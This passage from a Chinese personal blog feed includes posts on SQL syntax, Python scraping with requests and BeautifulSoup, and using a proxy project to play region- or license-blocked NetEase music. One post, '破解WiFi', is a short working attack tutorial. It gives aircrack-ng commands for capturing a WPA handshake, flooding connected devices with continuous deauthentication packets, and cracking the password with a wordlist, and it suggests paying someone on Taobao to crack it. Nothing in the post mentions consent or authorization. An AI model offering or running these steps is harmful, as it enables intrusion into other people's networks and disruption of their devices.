<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">&#x27;%lond%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>例子： 从 “Persons” 表中选取居住在<em>不包含</em> “lon” 的城市里的人 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%lon%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>例子：从  “Persons” 表中选取居住的城市<em>不以</em> “A” 或 “L” 或 “N” 开头的人 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">&#x27;[!ALN]%&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="IN操作符"><a href="#IN操作符" class="headerlink" title="IN操作符"></a>IN操作符</h3><p>在WHERE子句中规定多个值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...)</span><br></pre></td></tr></table></figure>

<h3 id="BETWEEN操作符"><a href="#BETWEEN操作符" class="headerlink" title="BETWEEN操作符"></a>BETWEEN操作符</h3><p> BETWEEN 操作符在 WHERE 子句中使用，作用是选取介于两个值之间的数据范围。</p>
<p> 操作符 BETWEEN … AND 会选取介于两个值之间的数据范围。 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name</span><br><span class="line"><span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2</span><br></pre></td></tr></table></figure>

<p>可结合NOT</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> LastName</span><br><span class="line"><span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;Adams&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;Carter&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="UNION-和-UNION-ALL操作符"><a href="#UNION-和-UNION-ALL操作符" class="headerlink" title="UNION 和 UNION ALL操作符"></a>UNION 和 UNION ALL操作符</h3><p>联合查询，结合结果集</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>

<p> 默认地，UNION 操作符选取不同的值。如果允许重复的值，使用 UNION ALL。 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>

<h3 id="SELECT-INTO语句"><a href="#SELECT-INTO语句" class="headerlink" title="SELECT INTO语句"></a>SELECT INTO语句</h3><p> 从一个表中选取数据，然后把数据插入另一个表中 </p>
<p>常用于备份</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">INTO</span> new_table_name [<span class="keyword">IN</span> externaldatabase] </span><br><span class="line"><span class="keyword">FROM</span> old_tablename</span><br></pre></td></tr></table></figure>

<h3 id="CREATE-DATABASE语句"><a href="#CREATE-DATABASE语句" class="headerlink" title="CREATE DATABASE语句"></a>CREATE DATABASE语句</h3><p>常见数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE database_name</span><br></pre></td></tr></table></figure>

<h3 id="CREATE-TABLE语句"><a href="#CREATE-TABLE语句" class="headerlink" title="CREATE TABLE语句"></a>CREATE TABLE语句</h3><p>创建数据库中的表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称</span><br><span class="line">(</span><br><span class="line">列名称<span class="number">1</span> 数据类型,</span><br><span class="line">列名称<span class="number">2</span> 数据类型,</span><br><span class="line">列名称<span class="number">3</span> 数据类型,</span><br><span class="line">....</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><h4 id="NOT-NULL"><a href="#NOT-NULL" class="headerlink" title="NOT NULL"></a>NOT NULL</h4><p>不接受空值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">LastName <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">FirstName <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="UNIQUE"><a href="#UNIQUE" class="headerlink" title="UNIQUE"></a>UNIQUE</h4><p> 约束唯一标识数据库表中的每条记录 </p>
<h4 id="PRIMARY-KEY"><a href="#PRIMARY-KEY" class="headerlink" title="PRIMARY KEY"></a>PRIMARY KEY</h4><p> 约束唯一标识数据库表中的每条记录 </p>
<h4 id="FOREIGN-KEY"><a href="#FOREIGN-KEY" class="headerlink" title="FOREIGN KEY"></a>FOREIGN KEY</h4><p> 一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY。 </p>
<h4 id="CHECK"><a href="#CHECK" class="headerlink" title="CHECK"></a>CHECK</h4><p> 约束用于限制列中的值的范围 </p>
<h4 id="DEFAULT"><a href="#DEFAULT" class="headerlink" title="DEFAULT"></a>DEFAULT</h4><p>  约束用于向列中插入默认值 </p>
<h3 id="SQL函数"><a href="#SQL函数" class="headerlink" title="SQL函数"></a>SQL函数</h3><p>……</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>破解WiFi</title>
    <url>/2020/03/11/%E7%A0%B4%E8%A7%A3WiFi/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>之前用过很多次了，这里简单的总结一下基本命令。</p>
<p>因为我有个废弃的笔记本直接安装的kali系统，所以不牵扯网卡问题。（如果用的虚拟机配置网卡的步骤很多）</p>
<h4 id="开启网卡监听模式"><a href="#开启网卡监听模式" class="headerlink" title="开启网卡监听模式"></a>开启网卡监听模式</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>

<p>开启成功后会自动断网，并且输入ifconfig会发现wlan0变成了wlan0mon</p>
<p>如果要关闭监听模式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>

<h4 id="扫描WiFi"><a href="#扫描WiFi" class="headerlink" title="扫描WiFi"></a>扫描WiFi</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>

<p>BSSID为WiFi的MAC地址；PWR为信号强弱（数字越小信号越强）；#Data为数据量（越大说明使用的人越多）；CH为信道频率（频道），ESSID为WiFi名称。</p>
<p>按CTRL+C结束任务</p>
<h4 id="开始抓包"><a href="#开始抓包" class="headerlink" title="开始抓包"></a>开始抓包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airodump-ng --bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon</span><br><span class="line"></span><br><span class="line">airodump-ng --bssid BC:5F:6F:3D:03:74 -c 13 -w /root/wifi wlan0mon   #例子</span><br></pre></td></tr></table></figure>

<p>如果有人连接此WiFi，出现WPA handshake表示抓包成功。</p>
<h4 id="洪水攻击强迫别人重连"><a href="#洪水攻击强迫别人重连" class="headerlink" title="洪水攻击强迫别人重连"></a>洪水攻击强迫别人重连</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airepaly-ng -0 0 -c 连接到WiFi设备的mac地址 -a bssid 网卡名（一般为wlan0mon）</span><br><span class="line"></span><br><span class="line">aireplay-ng -0 0 -c B8:37:65:94:5D:13 -a BC:5F:6F:3D:03:74 wlan0mon #例子</span><br></pre></td></tr></table></figure>

<p>-0 表示发起deauthentication攻击</p>
<p>0代表一直攻击</p>
<p>-a指定无线路由器BSSID</p>
<p>-c指定强制断开的设备（STATION那里）</p>
<p> 原理大体是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。 </p>
<h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><p>建议是花十块钱找淘宝破解，自己也可以百度搜集一些字典来破解，但是感觉自己破解太鸡肋了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/wifi-0.1.cap</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>雕虫小技</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>破解WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫基础总结</title>
    <url>/2020/03/09/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>管管：很多知识不用他，老是忘，一些语法函数啥的</p>
<p>晴晴：那多正常，抱你</p>
<p>管管：需要用的时候百度emmm，抱抱你</p>
<p>晴晴：找到时会用就可以，抱紧你</p>
<p>所以打算写博客记录一下bp4的基础语法，每次用到方便查阅的。</p>
<h3 id="简单的requests"><a href="#简单的requests" class="headerlink" title="简单的requests"></a>简单的requests</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r1 = requests.get(url=<span class="string">&#x27;http://dict.baidu.com/s&#x27;</span>, params=&#123;<span class="string">&#x27;wd&#x27;</span>: <span class="string">&#x27;python&#x27;</span>&#125;) <span class="comment">#GET请求</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=<span class="string">&#x27;http://dict.baidu.com/s&#x27;</span>, data=&#123;<span class="string">&#x27;wd&#x27;</span>: <span class="string">&#x27;python&#x27;</span>&#125;) <span class="comment">#POST请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment">#设置会话</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#注意编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.encoding <span class="comment">#获取当前的编码</span></span><br><span class="line">r.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#以utf-8解码</span></span><br><span class="line">r.text <span class="comment">#以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。</span></span><br><span class="line">r.content <span class="comment">#以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。</span></span><br><span class="line">r.status_code <span class="comment">#响应状态码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造头和cookie</span></span><br><span class="line">data = &#123;<span class="string">&#x27;some&#x27;</span>: <span class="string">&#x27;data&#x27;</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.post(<span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span>, data=data, headers=headers, cookies=cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;url&#x27;</span>,timeout=<span class="number">1</span>) <span class="comment">#设置秒数超时，仅对于连接有效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置代理</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;ip1&#x27;</span>,<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;ip2&#x27;</span> &#125;</span><br><span class="line">requests.get(<span class="string">&#x27;url&#x27;</span>,proxies=proxies)</span><br><span class="line"><span class="comment">#如果代理需要用户名和密码，则需要这样：</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://user:pass@10.10.1.10:3128/&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="简单的BeautifulSoup"><a href="#简单的BeautifulSoup" class="headerlink" title="简单的BeautifulSoup"></a>简单的BeautifulSoup</h3><p>做一锅汤对数据解析美化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">demo = r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#做一锅汤</span></span><br><span class="line">soup = BeautifulSoup(demo, <span class="string">&quot;html.parser&quot;</span>) <span class="comment">#html解析</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#定位及数据提取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定位标签</span></span><br><span class="line">soup.find(<span class="string">&#x27;div&#x27;</span>) <span class="comment">#但是只能返回一个跟soup.div作用等同</span></span><br><span class="line">soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&quot;content&quot;</span>) <span class="comment">#通过属性限制性定位标签，class比较特殊需要_</span></span><br><span class="line">soup.find_all(<span class="string">&#x27;div&#x27;</span>) <span class="comment">#返回所有的div，返回列表</span></span><br><span class="line"><span class="comment">#提取标签中的其他信息</span></span><br><span class="line">find(<span class="string">&#x27;a&#x27;</span>).get(<span class="string">&#x27;href&#x27;</span>) <span class="comment">#获取href的内容</span></span><br><span class="line">find(<span class="string">&#x27;a&#x27;</span>).get_text() <span class="comment">#获取a标签的文字内容</span></span><br></pre></td></tr></table></figure>

<h3 id="简单的lxml"><a href="#简单的lxml" class="headerlink" title="简单的lxml"></a>简单的lxml</h3><p>出来bp4还可以用xpath进行数据解析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">t = etree.HTML(demo)</span><br><span class="line"></span><br><span class="line">l = t.xpath(<span class="string">&#x27;/bookstore/book[1]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l :</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>关于xpath的知识之前有写过了</p>
<p> <a href="https://z3p5.github.io/z3p5/Selenium%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93.html#xpath%E5%AE%9A%E4%BD%8D">xpath定位</a> </p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
        <tag>BeautifulSoup</tag>
      </tags>
  </entry>
  <entry>
    <title>网易云听没有版权的音乐</title>
    <url>/2020/03/22/%E7%BD%91%E6%98%93%E4%BA%91%E5%90%AC%E6%B2%A1%E6%9C%89%E7%89%88%E6%9D%83%E7%9A%84%E9%9F%B3%E4%B9%90/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<h1 id="UnblockNeteaseMusic"><a href="#UnblockNeteaseMusic" class="headerlink" title="UnblockNeteaseMusic"></a>UnblockNeteaseMusic</h1><p>这是GitHub上的一个开源项目。</p>
<p>原项目地址： <a href="https://github.com/nondanee/UnblockNeteaseMusic">https://github.com/nondanee/UnblockNeteaseMusic</a> </p>
<p>基本原理是，利用代理，使别的平台的音乐补接到网易云，从而解锁 解锁网易云音乐客户端变灰歌曲 。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/nondanee/UnblockNeteaseMusic.git</span><br></pre></td></tr></table></figure>

<p>没有安装git的小白也可以直接点击右上角下载压缩包</p>
<p><img src="https://ech0zr.github.io/img/post/wangyi/wangyi1.jpg" alt="下载项目zip"></p>
<h2 id="下载并安装-Nodejs"><a href="#下载并安装-Nodejs" class="headerlink" title="下载并安装 Nodejs"></a>下载并安装 Nodejs</h2><p>部署hexo的时候已经安装过了。</p>
<p>去官网下载安装即可</p>
<p><a href="http://nodejs.cn/download/">Nodejs</a></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>进入项目目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node app.js -h</span><br></pre></td></tr></table></figure>

<p>查看参数配置等等</p>
<p>-p是指定端口，由于 在本机运行程序，需要通过-f指定网易云服务器 IP（通过ping music.163.com来获取网易云服务器ip）</p>
<p>所以命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node app.js -p 6789 -f 59.111.181.35</span><br></pre></td></tr></table></figure>

<h2 id="配置网易云客户端"><a href="#配置网易云客户端" class="headerlink" title="配置网易云客户端"></a>配置网易云客户端</h2><p>具体步骤不同设备的配置方法GitHub上都有。</p>
<p>这里简单介绍一下Windows的：</p>
<p><img src="https://ech0zr.github.io/img/post/wangyi/wangyi2.jpg" alt="windows配置"></p>
<p>之后重启一下就可以听宋东野的歌。</p>
<p><img src="https://ech0zr.github.io/img/post/wangyi/wangyi3.jpg" alt="宋东野的歌"></p>
<p>如果要在手机端，只要在同一个局域网下输入相应的端口设置代理即可。</p>
<h3 id="ios端设置"><a href="#ios端设置" class="headerlink" title="ios端设置"></a>ios端设置</h3><p>根据测试，ios端服务端要运行以下命令，不然显示网络不可用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node app.js -p 1234:4321 -e https://music.163.com</span><br></pre></td></tr></table></figure>

<p>并且需要安装项目里面的ca.crt证书！！！</p>
<p>为了使用方便我在iOS的小火箭里面添加了代理和过滤规则，其实最简单的方法就是在WiFi那里添加HTTP代理。</p>
<h4 id="Shadowrocket配置"><a href="#Shadowrocket配置" class="headerlink" title="Shadowrocket配置"></a>Shadowrocket配置</h4><ul>
<li><p>右上角加号添加节点</p>
</li>
<li><p>类型选择 HTTP</p>
</li>
<li><p>服务器填写你的服务器公网 IP</p>
</li>
<li><p>端口填写你启动服务的端口号（默认为 8080）</p>
</li>
<li><p>然后底部找到配置 点击本地文件 -&gt; default.conf -&gt; 编辑配置</p>
</li>
<li><p>添加三条规则 选项选择你刚刚添加的节点</p>
<p>USER-AGENT: NeteaseMusic*<br>DOMAIN-SUFFIX: 163.com<br>DOMAIN-SUFFIX: 126.net</p>
</li>
</ul>
<p><img src="https://ech0zr.github.io/img/post/wangyi/ios1.jpg" alt="ios1"></p>
<p><img src="https://ech0zr.github.io/img/post/wangyi/ios2.jpg" alt="ios2"></p>
<p><img src="https://ech0zr.github.io/img/post/wangyi/ios3.jpg" alt="ios3"></p>
<h1 id="更骚的操作"><a href="#更骚的操作" class="headerlink" title="更骚的操作"></a>更骚的操作</h1><h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><p>每次开机都要输入命令太麻烦？写个bat脚本解决，然后再加入开机启动即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start cmd /k &quot;cd /d D:\UnblockNeteaseMusic &amp;&amp; node app.js -p 6789 -f 59.111.181.38&quot;</span><br></pre></td></tr></table></figure>



<h2 id="随时使用"><a href="#随时使用" class="headerlink" title="随时使用"></a>随时使用</h2><p>不想被局域网舒服，可以将该项目部署到服务器上，美滋滋。</p>
<h3 id="服务器搭建教程"><a href="#服务器搭建教程" class="headerlink" title="服务器搭建教程"></a>服务器搭建教程</h3><p>Ubuntu16为例</p>
<h4 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get  update </span><br></pre></td></tr></table></figure>

<h4 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure>

<h4 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt install nodejs-legacy</span><br><span class="line">sudo apt install npm</span><br></pre></td></tr></table></figure>

<h4 id="更新npm版本"><a href="#更新npm版本" class="headerlink" title="更新npm版本"></a>更新npm版本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure>

<h4 id="全局安装n管理器-用于管理nodejs版本"><a href="#全局安装n管理器-用于管理nodejs版本" class="headerlink" title="全局安装n管理器(用于管理nodejs版本)"></a>全局安装n管理器(用于管理nodejs版本)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm cache clean -f #清除npm缓存</span><br><span class="line">sudo npm install n -g</span><br></pre></td></tr></table></figure>

<h4 id="安装最新的nodejs"><a href="#安装最新的nodejs" class="headerlink" title="安装最新的nodejs"></a>安装最新的nodejs</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo n stable</span><br></pre></td></tr></table></figure>

<h4 id="安装pm2"><a href="#安装pm2" class="headerlink" title="安装pm2"></a>安装pm2</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install pm2 -g</span><br></pre></td></tr></table></figure>

<h4 id="常用pm2命令"><a href="#常用pm2命令" class="headerlink" title="常用pm2命令"></a>常用pm2命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --name=&#x27;xxx&#x27; -- -p 444 #两个横杠后添加nodejs参数</span><br><span class="line">pm2 list</span><br><span class="line">pm2 stop 0</span><br><span class="line">pm2 delete 0</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h4 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd nblockNeteaseMusic</span><br><span class="line">pm2 start app.js --name=&#x27;win&#x27; -- -p 6789 -f 59.111.181.35 #适用于Windows、安卓</span><br><span class="line">pm2 start app.js --name=&#x27;ios&#x27; -- -p 1234:4321 -e https://music.163.com #适用于ios</span><br></pre></td></tr></table></figure>

<h3 id="配置酸酸乳转发"><a href="#配置酸酸乳转发" class="headerlink" title="配置酸酸乳转发"></a>配置酸酸乳转发</h3><p>可用工具：glider/goproxy</p>
<p> <a href="https://github.com/nadoo/glider">https://github.com/nadoo/glider</a> </p>
<p> <a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a> </p>
<h4 id="glider配置步骤："><a href="#glider配置步骤：" class="headerlink" title="glider配置步骤："></a>glider配置步骤：</h4><ul>
<li>下载：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://github.com/nadoo/glider/releases/download/v0.9.3/glider_0.9.3_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>解压：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf glider_0.9.3_linux_amd64.tar.gz &amp;&amp; cd glider_0.9.3_linux_amd64</span><br></pre></td></tr></table></figure>

<ul>
<li>复制二进制文件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp glider /usr/bin/ &amp;&amp; chmod +x /usr/bin/glider</span><br></pre></td></tr></table></figure>

<ul>
<li> 创建配置文件 </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /etc/glider/ &amp;&amp; vi /etc/glider/https-ss.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">verbose=True</span><br><span class="line"></span><br><span class="line">listen=ss://method:password@:port1</span><br><span class="line"></span><br><span class="line">forward=http://127.0.0.1:port2</span><br></pre></td></tr></table></figure>

<p> 需自行修改加密方式 method，密码 password，Shadowsocks 监听的端口 port 及 UnblockNeteaseMusic 监听的端口 。</p>
<p>method有的加密算法不存在，chacha20可以用。</p>
<h4 id="通过-systemd-创建开机启动"><a href="#通过-systemd-创建开机启动" class="headerlink" title="通过 systemd 创建开机启动"></a>通过 systemd 创建开机启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/system/glider-https-ss.service</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Glider UnblockNeteaseMusic Shadowsocks Service for macOS, iOS, Linux</span><br><span class="line">After=network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">LimitNOFILE=102400</span><br><span class="line">CPUAccounting=yes</span><br><span class="line">MemoryAccounting=yes</span><br><span class="line"></span><br><span class="line">ExecStart=/usr/bin/glider -config /etc/glider/https-ss.conf</span><br><span class="line"></span><br><span class="line">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE</span><br><span class="line">AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE</span><br><span class="line">NoNewPrivileges=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<h4 id="启用glider-https-ss-service"><a href="#启用glider-https-ss-service" class="headerlink" title="启用glider-https-ss.service"></a>启用glider-https-ss.service</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable glider-https-ss.service</span><br></pre></td></tr></table></figure>

<h4 id="启动-systemctl-enable-glider-https-ss-service"><a href="#启动-systemctl-enable-glider-https-ss-service" class="headerlink" title="启动 systemctl enable glider-https-ss.service"></a>启动 systemctl enable glider-https-ss.service</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start glider-https-ss.service</span><br></pre></td></tr></table></figure>

<h4 id="查看-glider-https-ss-service-状态"><a href="#查看-glider-https-ss-service-状态" class="headerlink" title="查看 glider-https-ss.service 状态"></a>查看 glider-https-ss.service 状态</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status glider-https-ss.service</span><br></pre></td></tr></table></figure>

<h4 id="使用node启动项目"><a href="#使用node启动项目" class="headerlink" title="使用node启动项目"></a>使用node启动项目</h4><p>pm2启动即可（上面提到）</p>
<p>要注意安卓ss工具选择，目前测试发现shadowsocks–universal-5.1.1好用！</p>
<p>下载地址： <a href="https://lanzous.com/id0tw5e">https://lanzous.com/id0tw5e</a> </p>
<h4 id="有时需要证书安装"><a href="#有时需要证书安装" class="headerlink" title="有时需要证书安装"></a>有时需要证书安装</h4><p>项目里面的ca.crt信任即可</p>
<h3 id="宝塔配置"><a href="#宝塔配置" class="headerlink" title="宝塔配置"></a>宝塔配置</h3><p>申请ssl</p>
<p>修改配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">      listen 443 ssl http2;</span><br><span class="line">      server_name your_domain; # 改为你自己的域名</span><br><span class="line">    </span><br><span class="line">      ssl_certificate 1_your_domain_bundle.crt; # 改为自己申请得到的 crt 文件的名称</span><br><span class="line">      ssl_certificate_key 2_your_domain.key; # 改为自己申请得到的 key 文件的名称</span><br><span class="line">      ssl_session_timeout 5m;</span><br><span class="line">      ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">      ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">      ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">        proxy_pass http://localhost:8080; # 代理到 Unblock 服务地址</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动命令</p>
